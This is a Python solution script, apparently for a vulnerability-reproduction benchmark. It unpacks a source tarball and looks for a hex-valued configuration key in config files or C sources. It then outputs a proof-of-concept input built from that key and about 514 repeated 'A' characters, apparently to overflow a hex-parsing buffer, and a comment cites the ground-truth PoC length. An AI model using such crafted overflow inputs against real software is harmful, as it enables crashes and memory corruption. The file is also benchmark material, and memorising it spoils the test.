import os
import re
import tarfile
import tempfile
from bisect import bisect_right
from typing import Dict, List, Optional, Tuple


def _safe_read_text(path: str, max_bytes: int = 2_000_000) -> str:
    try:
        with open(path, "rb") as f:
            data = f.read(max_bytes)
    except OSError:
        return ""
    if b"\x00" in data:
        return ""
    try:
        return data.decode("utf-8", errors="ignore")
    except Exception:
        try:
            return data.decode("latin-1", errors="ignore")
        except Exception:
            return ""


def _extract_tar(src_path: str) -> str:
    tmpdir = tempfile.mkdtemp(prefix="arvo_poc_")
    try:
        with tarfile.open(src_path, "r:*") as tf:
            members = tf.getmembers()
            safe_members = []
            for m in members:
                name = m.name
                if not name or name.startswith("/") or ".." in name.split("/"):
                    continue
                safe_members.append(m)
            tf.extractall(tmpdir, members=safe_members)
    except Exception:
        pass
    return tmpdir


def _collect_files(root: str) -> List[str]:
    out = []
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            out.append(os.path.join(dirpath, fn))
    return out


def _is_candidate_config_name(path: str) -> bool:
    base = os.path.basename(path).lower()
    ext = os.path.splitext(base)[1]
    if ext in (".conf", ".cfg", ".ini", ".cnf", ".config", ".properties"):
        return True
    if any(k in base for k in ("conf", "cfg", "ini", "config", "properties", "sample", "example", "default")):
        if ext in (".txt", ".in", ".dist", ".sample", ""):
            return True
    return False


_HEX_RE = re.compile(r"^(?:0x)?[0-9a-fA-F]{8,}$")


def _find_hex_like_config_line(text: str) -> Optional[Tuple[str, str]]:
    lines = text.splitlines()
    best = None
    for line in lines:
        raw = line.strip()
        if not raw:
            continue
        if raw.startswith(("#", ";", "//")):
            continue
        eq = raw.find("=")
        col = raw.find(":")
        if eq == -1 and col == -1:
            continue
        if eq != -1 and (col == -1 or eq < col):
            sep_pos = line.find("=")
        else:
            sep_pos = line.find(":")
        if sep_pos < 0:
            continue
        key_part = line[:sep_pos]
        rest = line[sep_pos + 1 :]
        key = key_part.strip()
        if not key:
            continue
        val = rest.strip()
        if not val:
            continue
        if (val.startswith('"') and val.endswith('"') and len(val) >= 2) or (val.startswith("'") and val.endswith("'") and len(val) >= 2):
            val = val[1:-1].strip()
        if _HEX_RE.match(val):
            idx = sep_pos + 1
            while idx < len(line) and line[idx] in (" ", "\t"):
                idx += 1
            prefix = line[:idx]
            score = 0
            if "hex" in key.lower():
                score += 10
            if any(k in key.lower() for k in ("key", "iv", "salt", "token", "hash", "mac", "seed", "secret", "cert", "sig", "digest")):
                score += 4
            score += min(len(val), 64) // 8
            if best is None or score > best[0]:
                best = (score, prefix)
    if best is None:
        return None
    return ("", best[1])


def _extract_prefix_from_config_line(line: str) -> Optional[str]:
    raw = line.strip()
    if not raw or raw.startswith(("#", ";", "//")):
        return None
    eq = line.find("=")
    col = line.find(":")
    if eq == -1 and col == -1:
        return None
    sep_pos = eq if (eq != -1 and (col == -1 or eq < col)) else col
    idx = sep_pos + 1
    while idx < len(line) and line[idx] in (" ", "\t"):
        idx += 1
    prefix = line[:idx]
    if not prefix.strip():
        return None
    if len(prefix) > 80:
        return None
    return prefix


def _find_best_prefix_from_config_files(files: List[str]) -> Optional[str]:
    candidates = []
    for p in files:
        if not _is_candidate_config_name(p):
            continue
        if os.path.getsize(p) > 200_000:
            continue
        text = _safe_read_text(p, max_bytes=200_000)
        if not text:
            continue
        lines = text.splitlines()
        for ln in lines:
            pref = _extract_prefix_from_config_line(ln)
            if pref is None:
                continue
            rest = ln[len(pref):].strip()
            if rest and _HEX_RE.match(rest.strip().strip('"').strip("'")):
                candidates.append(pref)
        if candidates:
            break
    if not candidates:
        return None
    def score_pref(pref: str) -> Tuple[int, int]:
        s = 0
        pl = pref.lower()
        if "hex" in pl:
            s += 10
        if any(k in pl for k in ("key", "iv", "salt", "token", "hash", "mac", "seed", "secret", "cert", "sig", "digest")):
            s += 4
        if "=" in pref:
            s += 2
        if ":" in pref:
            s += 1
        return (s, -len(pref))
    candidates.sort(key=score_pref, reverse=True)
    return candidates[0]


_STR_CMP_RE = re.compile(r'\bstr(?:case)?cmp\s*\(\s*([A-Za-z_]\w*)\s*,\s*"([^"]{1,64})"\s*\)')


def _find_best_key_from_source(files: List[str]) -> Optional[str]:
    best_key = None
    best_score = -1
    for p in files:
        low = p.lower()
        if not (low.endswith((".c", ".cc", ".cpp", ".h", ".hpp"))):
            continue
        if os.path.getsize(p) > 2_000_000:
            continue
        text = _safe_read_text(p, max_bytes=2_000_000)
        if not text:
            continue
        for m in _STR_CMP_RE.finditer(text):
            key = m.group(2)
            if not key or len(key) > 64:
                continue
            if not re.fullmatch(r"[A-Za-z0-9_.-]+", key):
                continue
            score = 0
            kl = key.lower()
            if "hex" in kl:
                score += 12
            if any(k in kl for k in ("key", "iv", "salt", "token", "hash", "mac", "seed", "secret", "cert", "sig", "digest")):
                score += 4
            if any(k in low for k in ("conf", "cfg", "config", "ini")):
                score += 2
            window = text[max(0, m.start() - 200) : min(len(text), m.end() + 200)].lower()
            if "strtol" in window or "strtoul" in window or "%x" in window or "isxdigit" in window:
                score += 6
            score += max(0, 10 - abs(len(key) - 3))
            if score > best_score:
                best_score = score
                best_key = key
    return best_key


def _choose_prefix(files: List[str]) -> str:
    pref = _find_best_prefix_from_config_files(files)
    if pref:
        return pref

    key = _find_best_key_from_source(files)
    if not key:
        key = "A"
    return f"{key}="


def _make_hex_payload(total_target: int, prefix: str, min_hex_len: int = 514) -> str:
    # Aim for total length close to total_target, but guarantee hex length >= min_hex_len and even.
    # total = len(prefix) + hex_len + 1 (newline)
    hex_len = total_target - (len(prefix) + 1)
    if hex_len < min_hex_len:
        hex_len = min_hex_len
    if hex_len % 2 == 1:
        hex_len -= 1
        if hex_len < min_hex_len:
            hex_len += 2
    return "A" * hex_len


class Solution:
    def solve(self, src_path: str) -> bytes:
        root = _extract_tar(src_path)
        try:
            files = _collect_files(root)
            prefix = _choose_prefix(files)
            # Ground-truth PoC length is 547; target that size when feasible.
            payload = _make_hex_payload(547, prefix, min_hex_len=514)
            poc = (prefix + payload + "\n").encode("ascii", errors="ignore")
            return poc
        finally:
            try:
                for dirpath, dirnames, filenames in os.walk(root, topdown=False):
                    for fn in filenames:
                        try:
                            os.remove(os.path.join(dirpath, fn))
                        except OSError:
                            pass
                    for dn in dirnames:
                        try:
                            os.rmdir(os.path.join(dirpath, dn))
                        except OSError:
                            pass
                try:
                    os.rmdir(root)
                except OSError:
                    pass
            except Exception:
                pass